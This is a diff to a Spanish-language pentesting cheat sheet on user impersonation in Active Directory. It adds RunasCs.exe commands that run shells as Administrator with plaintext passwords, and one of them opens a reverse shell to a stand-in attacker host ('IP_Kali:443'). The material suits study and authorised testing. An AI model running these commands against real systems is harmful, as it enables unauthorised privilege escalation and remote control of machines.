@@ -14,6 +14,21 @@ La impersonación en ciberseguridad, particularmente en entornos de Active Direc
 
 ## Formas de hacerlo 
 
+* [RunasCs](https://github.com/antonioCoco/RunasCs/releases/tag/v1.5)
+
+```powershell 
+❯ .\RunasCs.exe Administrator password123 "cmd.exe"
+# Ejecutar una reverse shell a Kali 
+❯ .\RunasCs.exe Administrator password123 "cmd.exe" -r IP_Kali:443 
+
+❯ .\RunasCs.exe Administrator password123 "powershell.exe" 
+❯ .\RunasCs.exe Administrator password123 "powershell.exe" -l 9
+	# -l 9 = Mismo comportamiento que '/netonly'
+
+# Ejecutar un comando 
+❯ .\RunasCs.exe corp\administrator Password123 "cmd.exe /c whoami"
+```
+
 ```powershell 
 Es un comando estándar de Windows que permite ejecutar un programa bajo una cuenta de usuario diferente. Utiliza el flag '/netonly' para indicar que las credenciales se usan solo para acceso remoto.
 
